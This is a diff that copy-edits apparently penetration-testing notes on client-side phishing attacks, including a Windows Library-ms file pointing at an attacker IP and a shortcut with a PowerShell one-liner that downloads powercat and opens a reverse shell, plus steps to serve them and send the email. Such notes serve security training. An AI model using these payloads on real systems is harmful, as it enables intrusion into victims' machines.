@@ -4,7 +4,7 @@
 
 ```shell
 exiftool <file>
-canarytokens.com # generate a fake url to collect victim data
+canarytokens.com # generate a fake URL to collect victim data
 ```
 
 ## Attacks
@@ -31,7 +31,7 @@ python mmg-odt.py windows <ip> <port>
 
 ### Windows Library
 
-In Windows, create a file **config.Library-ms** and put the attack IP in the url and save it.
+In Windows, create a file **config.Library-ms**, put the attack IP in the URL, and save it.
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -61,7 +61,7 @@ Now create a shortcut called **install** with the attack machine IP:
 powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.152:3333/powercat.ps1'); powercat -c 192.168.45.152 -p 4444 -e powershell"
 ```
 
-Transfer them to to the attack machine, start a webdav server to serve the shortcut, a python http server to serve the powercat script and a listener to receive the reverse shell and send the email.
+Transfer them to the attack machine, start a WebDAV server to serve the shortcut, a Python HTTP server to serve the powercat script, a listener to receive the reverse shell, and send the email.
 
 ### Create shortcuts
 
